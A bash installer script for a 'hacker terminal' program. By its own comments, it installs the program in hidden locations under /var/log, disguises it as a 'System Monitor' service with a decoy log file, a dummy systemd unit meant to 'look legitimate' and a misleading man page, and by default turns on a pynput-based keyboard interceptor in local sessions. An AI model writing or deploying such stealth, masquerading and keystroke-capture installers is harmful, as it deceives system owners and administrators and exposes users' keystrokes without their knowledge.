#!/bin/bash

# Hacker Terminal Stealth Installation Script
# This script installs the hacker terminal in hidden system locations
# and creates a system-wide 'show_time' command

set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Installation paths (hidden in system directories)
INSTALL_BASE="/var/log/.system_monitor"
BINARY_NAME="sysmon"
COMMAND_NAME="show_time"
SYSTEMD_SERVICE_NAME="system-monitor"

# Function to print colored output
print_status() {
    echo -e "${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "${RED}[!]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[*]${NC} $1"
}

# Check if running as root
check_root() {
    if [[ $EUID -ne 0 ]]; then
        print_error "This installer must be run as root for system integration"
        echo "Please run: sudo $0"
        exit 1
    fi
}

# Check system requirements
check_requirements() {
    print_status "Checking system requirements..."
    
    # Check for required commands
    local required_commands=("git" "wget" "tar")
    for cmd in "${required_commands[@]}"; do
        if ! command -v $cmd &> /dev/null; then
            print_error "$cmd is not installed"
            echo "Installing $cmd..."
            apt-get update -qq && apt-get install -y $cmd || {
                print_error "Failed to install $cmd"
                exit 1
            }
        fi
    done
    
    print_status "All requirements met"
}

# Install .NET SDK if not present
install_dotnet() {
    if command -v dotnet &> /dev/null; then
        print_status ".NET SDK already installed"
        return 0
    fi
    
    print_status "Installing .NET SDK..."
    
    # Microsoft's official installation script
    wget -q https://dot.net/v1/dotnet-install.sh -O /tmp/dotnet-install.sh
    chmod +x /tmp/dotnet-install.sh
    /tmp/dotnet-install.sh --channel 9.0 --install-dir /usr/share/dotnet
    
    # Create symlink
    ln -sf /usr/share/dotnet/dotnet /usr/bin/dotnet
    
    # Clean up
    rm -f /tmp/dotnet-install.sh
    
    print_status ".NET SDK installed successfully"
}

# Create installation directory structure
create_directory_structure() {
    print_status "Creating hidden directory structure..."
    
    # Create main directory (hidden in logs)
    mkdir -p "$INSTALL_BASE"/{bin,lib,config,logs}
    
    # Set restrictive permissions
    chmod 755 "$INSTALL_BASE"
    chmod 755 "$INSTALL_BASE"/{bin,lib,config,logs}
    
    # Create a decoy log file to blend in
    echo "System Monitor Service v2.3.1" > "$INSTALL_BASE/service.log"
    echo "Monitoring system resources..." >> "$INSTALL_BASE/service.log"
    date >> "$INSTALL_BASE/service.log"
}

# Build the application
build_application() {
    print_status "Building application..."
    
    # Create temporary build directory
    local build_dir="/tmp/build_$$"
    mkdir -p "$build_dir"
    
    # Copy source files
    cp -r src "$build_dir/"
    cp hacker-terminal.csproj "$build_dir/"
    cp effects_config.yaml "$build_dir/"
    
    # Build the application
    cd "$build_dir"
    dotnet publish -c Release -r linux-x64 --self-contained false -o "$INSTALL_BASE/lib" &> /dev/null || {
        print_error "Build failed"
        rm -rf "$build_dir"
        exit 1
    }
    
    # Copy configuration
    cp effects_config.yaml "$INSTALL_BASE/config/"
    
    # Clean up build directory
    cd - > /dev/null
    rm -rf "$build_dir"
    
    print_status "Application built successfully"
}

# Create wrapper script
create_wrapper_script() {
    print_status "Creating wrapper script..."
    
    cat > "$INSTALL_BASE/bin/$BINARY_NAME" << 'EOF'
#!/bin/bash
# System Monitor Service Wrapper

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BASE_DIR="$(dirname "$SCRIPT_DIR")"

# Set up environment
export DOTNET_ROOT=/usr/share/dotnet
export PATH=$DOTNET_ROOT:$PATH

# Configuration file
CONFIG_FILE="$BASE_DIR/config/effects_config.yaml"

# Change to lib directory
cd "$BASE_DIR/lib"

# Check if we should use keyboard interceptor
if [[ "$1" == "--enhanced" ]] || [[ -z "$SSH_CLIENT" && -z "$SSH_TTY" ]]; then
    # Not in SSH session, use interceptor
    exec dotnet hacker-terminal.dll --intercept
else
    # In SSH session or explicitly disabled
    exec dotnet hacker-terminal.dll
fi
EOF
    
    chmod 755 "$INSTALL_BASE/bin/$BINARY_NAME"
}

# Create system command
create_system_command() {
    print_status "Creating system command '$COMMAND_NAME'..."
    
    # Create command in /usr/local/bin
    cat > "/usr/local/bin/$COMMAND_NAME" << EOF
#!/bin/bash
# System Monitor Launcher

# Check terminal capabilities
if [[ -z "\$TERM" ]] || [[ "\$TERM" == "dumb" ]]; then
    echo "Error: This command requires a terminal with color support"
    exit 1
fi

# Clear screen for better effect
clear

# Launch the application
exec "$INSTALL_BASE/bin/$BINARY_NAME" "\$@"
EOF
    
    chmod 755 "/usr/local/bin/$COMMAND_NAME"
    
    # Also create alternative commands for variety
    ln -sf "/usr/local/bin/$COMMAND_NAME" "/usr/local/bin/showtime"
    ln -sf "/usr/local/bin/$COMMAND_NAME" "/usr/local/bin/show-time"
}

# Install Python dependencies for keyboard interceptor
install_python_deps() {
    print_status "Installing Python dependencies..."
    
    # Install pip if not present
    if ! command -v pip3 &> /dev/null; then
        apt-get update -qq && apt-get install -y python3-pip
    fi
    
    # Install pynput
    pip3 install pynput --quiet --break-system-packages 2>/dev/null || pip3 install pynput --quiet
    
    # Copy keyboard interceptor
    if [[ -f "python_scripts/keyboard_interceptor.py" ]]; then
        cp python_scripts/keyboard_interceptor.py "$INSTALL_BASE/lib/"
        chmod 644 "$INSTALL_BASE/lib/keyboard_interceptor.py"
    fi
}

# Create systemd service (optional - for persistence)
create_systemd_service() {
    print_status "Creating systemd service (optional)..."
    
    cat > "/etc/systemd/system/${SYSTEMD_SERVICE_NAME}.service" << EOF
[Unit]
Description=System Resource Monitor
After=network.target

[Service]
Type=simple
ExecStart=/bin/true
RemainAfterExit=yes
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
EOF
    
    # This is a dummy service that does nothing but makes it look legitimate
    systemctl daemon-reload
    
    print_status "Systemd service created (inactive by default)"
}

# Create shell completion
create_shell_completion() {
    print_status "Adding shell completion..."
    
    # Bash completion
    cat > "/etc/bash_completion.d/$COMMAND_NAME" << 'EOF'
_show_time_completion() {
    local cur="${COMP_WORDS[COMP_CWORD]}"
    local opts="--help --version --enhanced --no-intercept"
    COMPREPLY=( $(compgen -W "${opts}" -- ${cur}) )
}
complete -F _show_time_completion show_time showtime show-time
EOF
    
    chmod 644 "/etc/bash_completion.d/$COMMAND_NAME"
}

# Create man page
create_man_page() {
    print_status "Creating man page..."
    
    mkdir -p /usr/share/man/man1
    
    cat > "/usr/share/man/man1/${COMMAND_NAME}.1" << 'EOF'
.TH SHOW_TIME 1 "December 2024" "System Monitor 2.3.1" "User Commands"
.SH NAME
show_time \- System resource monitor with visual effects
.SH SYNOPSIS
.B show_time
[\fI\,OPTIONS\/\fR]
.SH DESCRIPTION
Display system resource information with enhanced visual effects.
This tool provides real-time monitoring of system resources with
an engaging visual interface.
.SH OPTIONS
.TP
\fB\-\-enhanced\fR
Enable enhanced mode with additional visual effects
.TP
\fB\-\-no\-intercept\fR
Disable keyboard interception (for remote sessions)
.TP
\fB\-\-help\fR
Display help information
.TP
\fB\-\-version\fR
Display version information
.SH EXIT STATUS
.TP
.B 0
Successful execution
.TP
.B 1
General error
.TP
.B 2
Invalid terminal environment
.SH AUTHOR
System Monitor Team
.SH SEE ALSO
.BR top (1),
.BR htop (1),
.BR systemctl (1)
EOF
    
    gzip -f "/usr/share/man/man1/${COMMAND_NAME}.1"
    mandb -q 2>/dev/null || true
}

# Clean up any previous installation
cleanup_old_installation() {
    if [[ -d "$INSTALL_BASE" ]]; then
        print_warning "Removing previous installation..."
        rm -rf "$INSTALL_BASE"
    fi
    
    # Remove old commands
    rm -f /usr/local/bin/{show_time,showtime,show-time}
    rm -f /etc/bash_completion.d/show_time
    rm -f /usr/share/man/man1/show_time.1.gz
}

# Main installation
main() {
    echo -e "${BLUE}================================${NC}"
    echo -e "${BLUE}  Hacker Terminal Installer${NC}"
    echo -e "${BLUE}================================${NC}"
    echo
    
    check_root
    check_requirements
    cleanup_old_installation
    install_dotnet
    create_directory_structure
    build_application
    create_wrapper_script
    install_python_deps
    create_system_command
    create_systemd_service
    create_shell_completion
    create_man_page
    
    echo
    print_status "Installation completed successfully!"
    echo
    echo -e "${GREEN}The '$COMMAND_NAME' command is now available system-wide${NC}"
    echo -e "${YELLOW}Usage:${NC}"
    echo "  show_time           - Run with default settings"
    echo "  show_time --enhanced - Run with keyboard interceptor"
    echo "  man show_time       - View the manual page"
    echo
    echo -e "${BLUE}Files installed to: $INSTALL_BASE${NC}"
    echo -e "${BLUE}Command location: /usr/local/bin/$COMMAND_NAME${NC}"
    echo
    print_warning "For shell completion to work, restart your shell or run: source /etc/bash_completion.d/$COMMAND_NAME"
}

# Run main installation
main "$@"